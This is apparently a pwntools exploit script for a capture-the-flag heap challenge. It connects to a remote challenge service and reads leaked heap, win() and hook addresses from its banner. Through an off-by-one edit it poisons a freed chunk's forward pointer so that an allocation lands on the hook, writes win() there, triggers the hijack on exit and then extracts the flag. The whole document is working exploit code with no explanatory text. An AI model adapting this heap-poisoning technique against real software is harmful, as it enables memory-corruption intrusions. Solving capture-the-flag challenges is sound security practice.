#!/usr/bin/env python3
from pwn import *

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

print(f"[+] heap: 0x{heap:x}, win: 0x{win:x}, hook: 0x{hook:x}")

# Try with size 0x20 (24 bytes)
size = 24

# Create and free chunks
io.sendline(b'1')
io.sendlineafter(b':', str(size).encode())
io.sendlineafter(b':', b'A' * size)
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', str(size).encode())
io.sendlineafter(b':', b'B' * size)
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', str(size).encode())
io.sendlineafter(b':', b'C' * size)
io.recvuntil(b'>')

# Free 0 and 1
io.sendline(b'3')
io.sendlineafter(b':', b'0')
io.recvuntil(b'>')

io.sendline(b'3')
io.sendlineafter(b':', b'1')
io.recvuntil(b'>')

# Edit chunk 2 with off-by-one
io.sendline(b'2')
io.sendlineafter(b':', b'2')
# Append 1 byte
io.sendlineafter(b':', b'\x00')
io.recvuntil(b'>')

# Reallocate and poison
io.sendline(b'1')
io.sendlineafter(b':', str(size).encode())
# Write hook-0x10 as fd
io.sendlineafter(b':', p64(hook - 0x10) + b'D' * (size - 8))
io.recvuntil(b'>')

# Allocate
io.sendline(b'1')
io.sendlineafter(b':', str(size).encode())
io.sendlineafter(b':', b'E' * size)
io.recvuntil(b'>')

# Should be at hook now
io.sendline(b'1')
io.sendlineafter(b':', str(size).encode())
io.sendlineafter(b':', p64(0) + p64(win) + b'F' * (size - 16))
io.recvuntil(b'>')

# Trigger
io.sendline(b'5')  # Exit

output = io.recvall(timeout=2)
result = output.decode(errors='ignore')
print("\n" + "="*60)
print(result)
print("="*60)

if 'ctf7{' in result:
    flag = re.search(r'ctf7\{[^}]+\}', result)
    if flag:
        print(f"\n[+] FLAG: {flag.group(0)}")

io.close()
